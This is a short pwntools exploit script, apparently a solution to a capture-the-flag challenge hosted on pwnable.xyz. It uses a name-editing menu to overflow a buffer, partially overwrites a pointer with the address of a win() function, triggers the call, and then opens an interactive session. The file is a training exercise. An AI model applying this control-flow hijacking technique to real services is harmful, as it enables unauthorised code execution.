from pwn import *

r = remote("svc.pwnable.xyz", 30009)

sla = r.sendlineafter
sa = r.sendafter


def play_game(answer=None):
    sla(b"> ", b"1")
    if answer is not None:
        sla(b"= ", str(answer).encode())


def save_game():
    sla(b"> ", b"2")


def edit_name(name):
    sla(b"> ", b"3")
    r.send(name)


win = 0x4009D6

sa(b"Name: ", b"a" * 16)

play_game(0)
save_game()
edit_name(b"a" * 0x18 + p64(win)[:3])
play_game()  # call win()

r.interactive()
